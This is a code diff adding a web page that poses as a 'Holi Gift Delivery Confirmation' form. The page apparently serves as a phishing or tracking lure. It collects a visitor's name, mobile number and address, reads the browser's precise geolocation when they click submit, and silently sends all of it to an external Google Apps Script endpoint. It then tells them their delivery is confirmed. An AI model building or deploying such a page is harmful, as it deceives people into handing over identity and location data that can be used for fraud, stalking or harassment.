@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Holi Gift Delivery Confirmation</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body{
+font-family:Arial;
+text-align:center;
+padding:30px;
+}
+
+input{
+width:90%;
+padding:12px;
+margin:10px;
+font-size:16px;
+}
+
+button{
+padding:14px 25px;
+font-size:16px;
+background:#ff6600;
+color:white;
+border:none;
+}
+</style>
+
+</head>
+
+<body>
+
+<h2>Holi Gift Delivery Confirmation</h2>
+
+<form id="form">
+
+<input type="text" name="name" placeholder="Full Name" autocomplete="name" required>
+
+<input type="tel" name="mobile" placeholder="Mobile Number" autocomplete="tel" required>
+
+<input type="text" name="address" placeholder="Full Address" autocomplete="street-address" required>
+
+<br>
+
+<button type="button" onclick="sendData()">Share Location & Submit</button>
+
+</form>
+
+<p id="status"></p>
+
+<script>
+
+function sendData(){
+
+navigator.geolocation.getCurrentPosition(function(pos){
+
+var lat = pos.coords.latitude;
+var lon = pos.coords.longitude;
+
+var name=document.querySelector('[name="name"]').value;
+var mobile=document.querySelector('[name="mobile"]').value;
+var address=document.querySelector('[name="address"]').value;
+
+var url="https://script.google.com/macros/s/AKfycbzNXNpbeZugB52WBumDBakWXbBpeER7UKP7V7Wov6rxAS5zka7t0zeXAWeugAVfjSQ1/exec?name="+name+"&mobile="+mobile+"&address="+address+"&lat="+lat+"&lon="+lon;
+
+fetch(url);
+
+document.getElementById("status").innerHTML="Thank you! Your delivery is confirmed.";
+
+});
+
+}
+
+</script>
+
+</body>
+</html>
